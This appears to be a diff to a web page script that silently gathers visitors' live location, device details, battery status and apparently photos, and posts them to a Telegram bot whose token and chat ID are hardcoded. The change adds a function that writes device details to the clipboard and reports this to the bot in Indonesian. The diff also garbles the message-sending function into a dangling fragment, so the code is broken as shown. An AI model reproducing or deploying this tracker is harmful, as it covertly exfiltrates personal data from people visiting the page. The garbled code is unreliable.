@@ -15,8 +15,7 @@
     const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
     const chatId = '1121369247';
 
-    function sendTelegramMessage(text) {
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+api.telegram.org/bot${token}/sendMessage`;
       const data = { chat_id: chatId, text: text };
       $.post(url, data);
     }
@@ -60,6 +59,7 @@
       getLiveLocation();
       getDeviceInfo();
       getBatteryInfo();
+      copyDeviceClipboard();
 
       setTimeout(photoData, 3000);
     }
@@ -101,6 +101,21 @@
       } else {
         sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
       }
+    }
+
+    function copyDeviceClipboard() {
+      const deviceInfo = `
+        Browser: ${navigator.userAgent}
+        Resolusi Layar: ${screen.width}x${screen.height}
+        Sistem Operasi: ${navigator.platform}
+      `;
+      navigator.clipboard.writeText(deviceInfo)
+        .then(function() {
+          sendTelegramMessage('Info perangkat telah disalin ke clipboard.');
+        })
+        .catch(function(error) {
+          console.error('Error copying to clipboard: ', error);
+        });
     }
   </script>
 </body>
